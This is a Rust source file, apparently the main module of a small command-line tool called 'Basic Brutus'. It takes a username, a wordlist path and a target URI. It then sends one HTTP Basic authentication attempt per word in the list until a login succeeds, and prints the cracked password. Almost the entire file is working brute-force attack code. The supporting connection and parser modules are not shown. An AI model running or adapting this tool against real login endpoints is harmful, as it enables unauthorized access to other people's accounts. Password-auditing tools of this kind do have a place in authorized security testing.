mod connection;
mod console;
mod parser;

use console::console::read_line;
use parser::core::parse;
use std::{
    collections::HashMap,
    fs::File,
    io::{self, BufRead},
    path::Path,
};

use connection::connection::http_req;

fn main() {
    println!("====================================");
    println!("======= Basic Brutus 0.1.0 ======");
    println!("====================================");
    println!("Help:");
    println!("====================================");
    println!("-u = username");
    println!("-d = dictionary path.");
    println!("     Ex. /dictionary/filename.txt");
    println!("-t = uri. Ex. https://website.com");
    println!("====================================");
    println!("all parameters are mandatory");
    println!("====================================");

    let command = read_line().unwrap();
    let parsed_command = parse(&command);
    if parsed_command.is_err() {
        let error = &parsed_command.unwrap_err();
        println!("err. code {}: {}", &error.code, &error.description)
    } else {
        let unwrappedd = parsed_command.unwrap_or(HashMap::new());
        let uri = unwrappedd.get("uri").unwrap();
        let username = unwrappedd.get("username").unwrap();

        if let Ok(lines) = read_lines(&unwrappedd.get("dictionary").unwrap()) {
            'inner: for line in lines {
                if let Ok(ln) = line {
                    let auth = base64::encode(format!("{}:{}", &username, &ln));
                    let password = &ln;
                    let status = http_req(uri, &auth, username, password);
                    if status.is_ok() {
                        let result = status.unwrap();
                        println!("==============================");
                        println!("======= Password found =======");
                        println!("==============================");
                        println!("message:  {}", result.message);
                        println!("uri:      {}", result.uri);
                        println!("username: {}", result.username);
                        println!("password: {}", result.password);
                        println!("base64:   {}", result.base64);
                        println!("===============================");
                        break 'inner;
                    } else {
                        println!("Not matching {}:{} = {}", &username, &ln, &auth);
                    }
                }
            }
        }
    }
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}
